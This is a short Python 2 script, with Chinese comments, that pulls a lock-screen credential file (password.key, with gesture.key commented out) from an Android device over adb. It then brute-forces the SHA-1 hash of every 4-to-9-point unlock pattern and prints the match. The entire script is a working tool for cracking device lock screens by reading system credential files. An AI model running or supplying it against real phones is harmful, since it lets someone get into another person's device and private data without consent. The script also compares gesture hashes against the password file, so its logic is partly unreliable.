#coding=utf-8
__author__ = 'Hanz'
import hashlib
import time
import os
import itertools

#取出gesture.key文件，此文件为密码图
# os.system("adb pull /data/system/gesture.key gesture.key")
os.system("adb pull /data/system/password.key password.key")
time.sleep(3)
f = open('password.key','r')
pswd = f.readline()
f.close()

pswd_hex = pswd.encode('hex')
print "加密后的密码为：%s" %pswd_hex

# 生成序列
matrix = []
for i in xrange(0, 9):
    str_temp = '0'+str(i)
    matrix.append(str_temp)
print matrix

min_num = 4
max_num = len(matrix)

for num in xrange(min_num, max_num+1):
    iter1 = itertools.permutations(matrix,num)
    list_m = []
    list_m.append(list(iter1))
    for el in list_m[0]:
        strlist = ''.join(el)
        strlist_sha1 = hashlib.sha1(strlist.decode('hex')).hexdigest()
        if pswd_hex==strlist_sha1:
            print "解锁密码为：", strlist
